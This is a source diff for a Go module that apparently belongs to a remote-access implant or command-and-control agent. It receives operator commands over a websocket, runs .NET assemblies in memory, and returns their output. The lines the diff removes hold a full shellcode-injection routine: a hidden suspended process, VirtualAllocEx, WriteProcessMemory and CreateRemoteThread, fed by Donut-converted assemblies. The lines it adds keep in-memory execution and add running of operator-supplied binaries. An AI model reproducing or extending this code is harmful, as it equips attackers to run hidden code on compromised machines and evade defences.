@@ -11,20 +11,14 @@ package HandlePacket
 import (
 	// Standard
 
-	"bytes"
 	"fmt"
 	"log"
-	"main/Helper/generate"
-	"main/Helper/syscalls"
-	"main/MessagePack"
-	"main/PcInfo"
-	"os/exec"
-	"runtime"
-	"strings"
-	"syscall"
-	"time"
 
-	clr "github.com/Ne0nd0g/go-clr"
+	"main/MessagePack"
+	"runtime"
+
+	"github.com/Ne0nd0g/go-clr"
+
 	"github.com/togettoyou/wsc"
 	"golang.org/x/sys/windows"
 )
@@ -976,212 +970,49 @@ var CurrentToken windows.Token
 var DotnetVersion string
 
 func Assembly(assemblyBytes []byte, Connection *wsc.Wsc, arguments string, unmsgpack *MessagePack.MsgPack) {
-	Process64 := unmsgpack.ForcePathObject("Process64").GetAsString()
-	Process86 := unmsgpack.ForcePathObject("Process86").GetAsString()
-	if Process64 == "" && Process86 == "" {
+	var prog string
+	if runtime.GOARCH == "amd64" {
+		prog = unmsgpack.ForcePathObject("Process64").GetAsString()
+	} else {
+		prog = unmsgpack.ForcePathObject("Process86").GetAsString()
+	}
+
+	// Read the file into Bytes
+
+	// Read the file into Bytes
+
+	if prog == "" {
 		InlineAssembly(assemblyBytes, Connection, arguments, unmsgpack)
 	} else {
-
-		assemblyArgsStr := strings.TrimSpace(arguments)
-
-		// Read the file into Bytes
-		donutBytes, err := generate.DonutFromAssembly(assemblyBytes, false, "amd64", assemblyArgsStr, "", "", "")
-		if err != nil {
-			fmt.Printf("%s", err)
-			return
-		}
-		if runtime.GOARCH == "amd64" {
-			resp, err := ExecuteAssembly(donutBytes, Process64)
-			if err != nil {
-				fmt.Printf("%s", err)
-				return
-			}
-			SessionLog(resp, Connection, *unmsgpack)
-		} else {
-			resp, err := ExecuteAssembly(donutBytes, Process86)
-			if err != nil {
-				fmt.Printf("%s", err)
-				return
-			}
-			SessionLog(resp, Connection, *unmsgpack)
-		}
-
+		fmt.Println(unmsgpack.ForcePathObject("args").GetAsString())
+		RunCreateProcessWithPipe(unmsgpack.ForcePathObject("Bin").GetAsBytes(), prog, ""+unmsgpack.ForcePathObject("args").GetAsString(), Connection)
 	}
 }
 
 func InlineAssembly(data []byte, Connection *wsc.Wsc, arguments string, unmsgpack *MessagePack.MsgPack) {
-	// generate.goAssembly(Nps_4,"whoami",false)
+	//assemblyArgsStr := strings.TrimSpace(arguments)
 	err := clr.RedirectStdoutStderr()
 	if err != nil {
-		SessionLog(err.Error(), Connection, *unmsgpack)
+		log.Fatal(err)
 	}
-	if PcInfo.IsDotNetFour {
-		DotnetVersion = "v4"
-	} else {
-		DotnetVersion = "v2"
-	}
-	runtimeHost, err := clr.LoadCLR(DotnetVersion)
-
+	runtimeHost, err := clr.LoadCLR("v4")
 	if err != nil {
-		// log.Fatal(err)
-		SessionLog(err.Error(), Connection, *unmsgpack)
+		log.Fatal(err)
 	}
-
 	methodInfo, err := clr.LoadAssembly(runtimeHost, data)
 	if err != nil {
-		SessionLog(err.Error(), Connection, *unmsgpack)
+		log.Fatal(err)
 	}
-	//fmt.Println(unmsgpack.ForcePathObject("OutString").GetAsString())
 	stdout, stderr := clr.InvokeAssembly(methodInfo, []string{arguments})
+	// Print returned output
 	if stderr != "" {
 		SessionLog(stderr, Connection, *unmsgpack)
+		fmt.Println(stderr)
 	}
 	if stdout != "" {
 		SessionLog(stdout, Connection, *unmsgpack)
+		fmt.Println(stdout)
 	}
-}
-
-func ExecuteAssembly(data []byte, process string) (string, error) {
-	var (
-		stdoutBuf, stderrBuf bytes.Buffer
-		lpTargetHandle       windows.Handle
-	)
-	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
-	if err != nil {
-		// log.Println("Could not start process:", process)
-		return "", err
-	}
-	pid := cmd.Process.Pid
-	// log.Printf("[*] %s started,pid = %d\n", process, pid)
-	handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))
-	if err != nil {
-		return "", err
-	}
-	defer windows.CloseHandle(handle)
-	defer windows.CloseHandle(lpTargetHandle)
-	currentProcHandle, err := windows.GetCurrentProcess()
-	if err != nil {
-		// log.Println("GetCurrentProcess failed")
-		return "", err
-	}
-	err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
-	if err != nil {
-		// log.Println("DuplicateHandle failed")
-		return "", err
-	}
-	threadHandle, err := injectTask(lpTargetHandle, data, false)
-	if err != nil {
-		return "", err
-	}
-	err = waitForCompletion(threadHandle)
-	if err != nil {
-		return "", err
-	}
-	err = cmd.Process.Kill()
-	if err != nil {
-		// log.Printf("Kill failed: %s\n", err.Error())
-	}
-	return stdoutBuf.String() + stderrBuf.String(), nil
-}
-
-// injectTask - Injects shellcode into a process handle
-func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error) {
-	var (
-		err          error
-		remoteAddr   uintptr
-		threadHandle windows.Handle
-	)
-	dataSize := len(data)
-	// Remotely allocate memory in the target process
-	// log.Println("allocating remote process memory ...")
-	if rwxPages {
-		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
-	} else {
-		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	}
-
-	//log.Printf("virtualallocex returned: remoteAddr = %#x,err = %v", remoteAddr, err)
-
-	if err != nil {
-
-		log.Println("[!] failed to allocate remote process memory")
-
-		return threadHandle, err
-	}
-
-	// Write the shellcode into the remotely allocated buffer
-	var nLength uintptr
-	err = syscalls.WriteProcessMemory(processHandle, remoteAddr, &data[0], uintptr(uint32(dataSize)), &nLength)
-
-	//log.Printf("writeprocessmemory returned: err = %v", err)
-
-	if err != nil {
-
-		//log.Printf("[!] failed to write data into remote process")
-
-		return threadHandle, err
-	}
-	if !rwxPages {
-		var oldProtect uint32
-		// Set proper page permissions
-		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
-		if err != nil {
-			// log.Println("VirtualProtectEx failed:", err)
-			return threadHandle, err
-		}
-	}
-	// Create the remote thread to where we wrote the shellcode
-	//log.Println("successfully injected data,starting remote thread ....")
-
-	attr := new(windows.SecurityAttributes)
-	var lpThreadId uint32
-	threadHandle, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
-
-	//log.Printf("createremotethread returned:  err = %v", err)
-
-	if err != nil {
-		// log.Printf("[!] failed to create remote thread")
-		return threadHandle, err
-	}
-	return threadHandle, nil
-}
-
-func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
-	cmd := exec.Command(proc)
-	cmd.SysProcAttr = &windows.SysProcAttr{
-		Token: syscall.Token(CurrentToken),
-	}
-	cmd.Stdout = stdout
-	cmd.Stderr = stderr
-	cmd.SysProcAttr = &windows.SysProcAttr{
-		HideWindow: true,
-	}
-	if suspended {
-		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
-	}
-	err := cmd.Start()
-	if err != nil {
-		// log.Println("Could not start process:", proc)
-		return nil, err
-	}
-	return cmd, nil
-}
-
-func waitForCompletion(threadHandle windows.Handle) error {
-	for {
-		var code uint32
-		err := syscalls.GetExitCodeThread(threadHandle, &code)
-		// log.Println(code)
-		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
-			// log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
-			return err
-		}
-		// log.Printf("[!] waitforCompletion Error: %v,code: %d\n", err, code)
-		if code == syscalls.STILL_ACTIVE {
-			time.Sleep(time.Second)
-		} else {
-			break
-		}
-	}
-	return nil
+	//runtimeHost.Release()
+	//methodInfo.Release()
 }
